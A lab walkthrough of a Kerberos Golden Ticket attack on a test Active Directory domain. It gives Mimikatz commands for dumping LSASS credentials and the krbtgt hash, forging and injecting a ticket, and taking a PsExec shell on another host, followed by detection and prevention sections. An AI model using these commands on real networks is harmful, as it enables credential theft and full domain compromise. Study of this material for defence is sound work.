# Golden Ticket Generation

**Date:** June 2026 <br>
**Author:** ShahinSecLab <br>
**Category:** Persistence <br>
**Difficulty:** Easy <br>
**Tools:** Mimikatz, PSExec, Evil-WinRM

## Table of Contents 

* [Introduction](#introduction)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 — Downloading Mimikatz in Kali](#step-1--downloading-mimikatz-in-kali)
* [Step 2 — Running Mimikatz on the DC](#step-2--running-mimikatz-on-the-dc)
* [Step 3 — Dumping Credentials from Memory](#step-3--dumping-credentials-from-memory)
* [Step 4 — Dumping the krbtgt Hash](#step-4--dumping-the-krbtgt-hash)
* [Step 5 — Generating and Injecting the Golden Ticket](#step-5--generating-and-injecting-the-golden-ticket)
* [Step 6 — Opening a CMD Shell with the Golden Ticket](#step-6--opening-a-cmd-shell-with-the-golden-ticket)
* [Step 7 — Accessing Victim Machine File System](#step-7--accessing-victim-machine-file-system)
* [Step 8 — Getting a Shell on the Victim Machine](#step-8--getting-a-shell-on-the-victim-machine)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)

## Introduction

A Golden Ticket is a fake Kerberos ticket that lets an attacker log in to an Active Directory domain without knowing a real user's password. With this ticket, the attacker can access domain resources as any user, including the Domain Administrator.

This attack depends on the `krbtgt` account. The `krbtgt` account is used by the Domain Controller to create and verify Kerberos tickets. If an attacker gets the `krbtgt` NTLM hash, they can create their own Kerberos tickets and use them to access other machines in the domain.

A Golden Ticket can stay valid for a long time, depending on how it is created. The only way to completely stop it is to reset the `krbtgt` password twice.

## Attack Flow
```
Gain Domain Admin Access
          ↓
Run Mimikatz on the Domain Controller
          ↓
Enable Debug Privilege
          ↓
Dump the Domain SID and krbtgt NTLM Hash
          ↓
Create a Golden Ticket
          ↓
Inject the Golden Ticket into Memory
          ↓
Open a New CMD Session
          ↓
Use the Golden Ticket to Access Another Domain Machine
          ↓
Access the Remote C$ Administrative Share
          ↓
Use PSExec to Get a Remote CMD Shell
          ↓
Take Full Control of the Target Machine
```
## Why This Attack Works

This attack works because Kerberos accepts Ticket Granting Tickets (TGTs) that are signed with the `krbtgt` account. If an attacker gets the `krbtgt` NTLM hash, they can create their own Kerberos tickets.

Since the forged ticket is signed with the correct `krbtgt` hash, the Domain Controller accepts it as a valid ticket. This allows the attacker to access domain resources as almost any user without knowing that user's password.

## Lab Setup

| Component            | Value               |
| -------------------- | ------------------- |
| Attacker Machine     | Kali Linux          |
| Domain Controller    | Windows Server 2022 |
| Victim Machine       | Windows 10          |
| Domain               | `readteambd.local`  |
| Domain Admin Account | `Administrator`     |

## Tools Used

| Tool       | Purpose                                                  |
| ---------- | -------------------------------------------------------- |
| `Mimikatz`   | Dump the `krbtgt` NTLM hash and create the Golden Ticket |
| `PSExec`     | Execute commands and get a remote CMD shell              |
| `Evil-WinRM` | Connect to Windows systems over WinRM                    |

## Prerequisites

| What          | Why                                           |
| ------------------- | ------------------------------------------------- |
| Domain Admin Access | Required to run Mimikatz on the Domain Controller |
| `krbtgt` NTLM Hash  | Required to create a Golden Ticket                |
| Domain SID          | Required to generate the Golden Ticket            |
| Domain Name         | Required when creating the ticket                 |

## Step 1 — Downloading Mimikatz in Kali

First, I downloaded `mimikatz_trunk.zip` from GitHub on my Kali machine, then copied it to the Domain Controller. After that, I extracted the zip file on the DC.


## Step 2 — Running Mimikatz on the DC

After that, I opened CMD on the DC. Since `mimikatz.exe` was in my Downloads folder, I moved to that directory and ran it.

```bash
C:\Users\Administrator\Downloads>mimikatz.exe
```
**Output:**

```text
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

  mimikatz #
  ```
### Enable Debug Privilege

```bash
mimikatz # privilege::debug
```
**Output:**

```text
Privilege '20' OK
```

`Privilege '20' OK` means Mimikatz successfully enabled **SeDebugPrivilege**. This privilege allows Mimikatz to access protected processes like LSASS, which handles authentication information on Windows.

LSASS stands for **Local Security Authority Subsystem Service**.
When a user logs into Windows, LSASS:

- Verifies username and password
- Checks credentials against local accounts or Active Directory
- Creates access tokens for users
- Applies security policies

## Step 3 — Dumping Credentials from Memory

Now I need the Domain SID and user credential information from the Domain Controller.

```bash
mimikatz # sekurlsa::logonpasswords
```
This command tells Mimikatz to dig into LSASS process memory and pull out all the credentials Windows is storing there.
Mimikatz reaches into that memory and pulls everything out.

**Output:**

```
Authentication Id : 0 ; 910653 (00000000:000de53d)
Session           : Interactive from 1
User Name         : Administrator
Domain            : READTEAMBD
Logon Server      : REDTEAMBD-DC
Logon Time        : 6/6/2026 11:07:52 AM
SID               : S-1-5-21-2745015721-426968701-4006811760-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : READTEAMBD
         * NTLM     : fc525c9683e8fe067095ba2ddc971889
         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
         * DPAPI    : 254d7e38c7b4a507b03f747b5177a2af
```

### Credentials Recovered

| User            | Domain       | NTLM Hash                          |
|-----------------|--------------|------------------------------------|
| `Administrator` | `READTEAMBD` | `fc525c9683e8fe067095ba2ddc971889` |
| `REDTEAMBD-DC$` | `READTEAMBD` | `5d61398d1bb36494251624d87522d005` |

The Administrator NTLM hash was recovered from memory. This hash can be used for authentication without knowing the original password.

<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step3.png" width="600">
</p>

## Step 4 — Dumping the krbtgt Hash

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt
```
**Flag Breakdown**

| Flag           | Description                                               |
|----------------|-----------------------------------------------------------|
| `lsadump::lsa` | Dumps credentials from the LSA (Local Security Authority) |
| `/inject`      | Injects into the LSASS process to extract data            |
| `/name:krbtgt` | Targets specifically the `krbtgt` account                 |

Instead of dumping information from all accounts, this command targets only the `krbtgt` account. The `krbtgt` hash is required to create a Golden Ticket.

This command also provides the Domain SID, which is needed when generating the ticket.

<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step4.png" width="600">
</p>

## Step 5 — Generating and Injecting the Golden Ticket

```bash
kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745015721-426968701-4006811760 /krbtgt:5f8156b8f557baae7cd069ac724e1959 /id:500 /ptt
```

**Flag Breakdown**

| Flag | Value | Description |
|------|-------|-------------|
| `/user` | `Administrator` | The user I am impersonating |
| `/domain` | `readteambd.local` | The domain name |
| `/sid` | `S-1-5-21-2745015721-426968701-4006811760` | The domain SID |
| `/krbtgt` | `5f8156b8f557baae7cd069ac724e1959` | The krbtgt NTLM hash used to sign the ticket |
| `/id` | `500` | RID of Administrator account — 500 is always the built-in Administrator |
| `/ptt` | — | Pass the Ticket — injects the forged ticket directly into memory instead of saving to a file |

I used `/ptt` so the generated ticket was loaded into the current session immediately. This allowed the session to use the forged ticket for authentication without loading it manually.

**Output:**

```
User      : Administrator
Domain    : readteambd.local (READTEAMBD)
SID       : S-1-5-21-2745015721-426968701-4006811760
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5f8156b8f557baae7cd069ac724e1959 - rc4_hmac_nt
Lifetime  : 6/6/2026 9:15:09 PM ; 6/3/2036 9:15:09 PM ; 6/3/2036 9:15:09 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ readteambd.local' successfully submitted for current session
```

<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step5.png" width="600">
</p>

## Step 6 — Opening a CMD Shell with the Golden Ticket

```bash
mimikatz # misc::cmd
```
After injecting the Golden Ticket using `/ptt`, I used `misc::cmd` to open a new CMD shell with the current ticket session.

Any command executed inside this CMD shell will use the injected Kerberos ticket for authentication. Since the ticket was created with Domain Admin privileges, I can access domain resources with administrative rights.

## Step 7 — Accessing Victim Machine File System

```bash
dir \\192.168.5.142\c$
```

**Flag Breakdown**

| Flag | Description |
|------|-------------|
| `dir` | Lists files and folders |
| `\\192.168.5.142` | IP address of the target victim machine |
| `\c$` | The C drive admin share — only accessible to Domain Admins |

**Output:**

```
 Volume in drive \\192.168.5.142\C$ has no label.
 Volume Serial Number is D040-B181

 Directory of \\192.168.5.142\C$

06/04/2026  09:01 AM    <DIR>          inetpub
12/07/2019  02:14 AM    <DIR>          PerfLogs
05/31/2026  10:56 PM    <DIR>          Program Files
05/05/2023  05:27 AM    <DIR>          Program Files (x86)
05/30/2026  11:23 PM    <DIR>          Users
06/06/2026  10:00 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  29,588,279,296 bytes free
```
<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step7.png" width="600">
</p>

**What This Proves**
If this command returns the contents of the C drive, it shows that the Golden Ticket was accepted by the target machine.

I was able to access another machine in the domain with Domain Administrator privileges without using a real password. The forged Kerberos ticket was enough to authenticate successfully.

## Step 8 — Getting a Shell on the Victim Machine

```cmd
psexec \\192.168.5.142 cmd.exe
```

**Flag Breakdown**

| Flag | Description |
|------|-------------|
| `psexec` | Sysinternals tool that runs commands remotely on other machines |
| `\\192.168.5.142` | IP address of the target victim machine |
| `cmd.exe` | Opens a CMD shell on that machine |


After the Golden Ticket was loaded into my session, I used PSExec to get a full interactive CMD shell on the victim machine at `192.168.5.142`. No password, no credentials, just the forged ticket doing all the work.

**Output:**

```
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.19045.6456]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
<p align="center">
  <img src="/Active-Directory/08-golden ticket/images/step8.png" width="600">
</p>

### What This Proves

```
Golden Ticket injected into session
          ↓
Used ticket to authenticate to victim machine
          ↓
Accessed the machine remotely using PSExec
          ↓
Obtained an administrative CMD shell
```
This confirms that the Golden Ticket attack worked successfully. I moved from the Domain Controller to another machine in the domain using a forged Kerberos ticket instead of a real user password.

## How Defenders Can Catch This

| Indicator                      | What to Look For                                               |
| ------------------------------ | -------------------------------------------------------------- |
| Long lifetime Kerberos tickets | Tickets that are valid for an unusual amount of time           |
| Event ID 4768                  | Suspicious TGT requests                                        |
| Event ID 4769                  | Unusual Kerberos service ticket requests                       |
| Event ID 4624                  | Login activity from unknown or unusual systems                 |
| LSASS access                   | Unknown programs trying to read LSASS memory                   |
| Mimikatz usage                 | Execution of credential dumping tools on the Domain Controller |
| Multiple system access         | One account accessing many machines quickly                    |
| Admin share access             | Unexpected access to `C$` or `ADMIN$` shares                   |

## How to Prevent It

* Protect the `krbtgt` account because it is used to create Kerberos tickets.
* Reset the `krbtgt` password twice after a Golden Ticket attack.
* Do not give Domain Admin access to unnecessary users.
* Enable Credential Guard to protect credentials stored in memory.
* Keep Domain Controllers updated.
* Monitor Kerberos login activity.
* Use strong passwords for administrator accounts.
* Remove unused privileged accounts.
* Limit access between systems to reduce lateral movement.

## References

| Resource                                                 | Link                                                                                                                                 |
| -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| Kerberos Authentication Overview                         | https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview                                  |
| Credential Guard                                         | https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard                             |
| Protected Users Security Group                           | https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group       |
| New-KrbtgtKeys.ps1                                       | https://github.com/microsoft/New-KrbtgtKeys.ps1                                                                                      |
| Kerberos krbtgt Password Reset                           | https://techcommunity.microsoft.com/t5/microsoft-security-baselines/kerberos-krbtgt-password-reset-scripts-now-available/ba-p/247381 |
| Golden Ticket - MITRE ATT&CK T1558.001                   | https://attack.mitre.org/techniques/T1558/001/                                                                                       |
| LSASS Memory Credential Dumping - MITRE ATT&CK T1003.001 | https://attack.mitre.org/techniques/T1003/001/                                                                                       |
| Mimikatz                                                 | https://github.com/gentilkiwi/mimikatz                                                                                               |
| PsExec                                                   | https://learn.microsoft.com/en-us/sysinternals/downloads/psexec                                                                      |
| Evil-WinRM                                               | https://github.com/Hackplayers/evil-winrm                                                                                            |

## Lessons Learned

* The `krbtgt` account is the most important account for Kerberos authentication.
* If an attacker gets the `krbtgt` hash, they can create their own Golden Ticket.
* A Golden Ticket allows access without using a real password.
* Changing the Administrator password does not remove a Golden Ticket.
* The `krbtgt` password must be changed twice to remove existing tickets.
* Protecting the Domain Controller is very important because it stores sensitive Active Directory information.
* Proper monitoring can help find suspicious Kerberos activity.
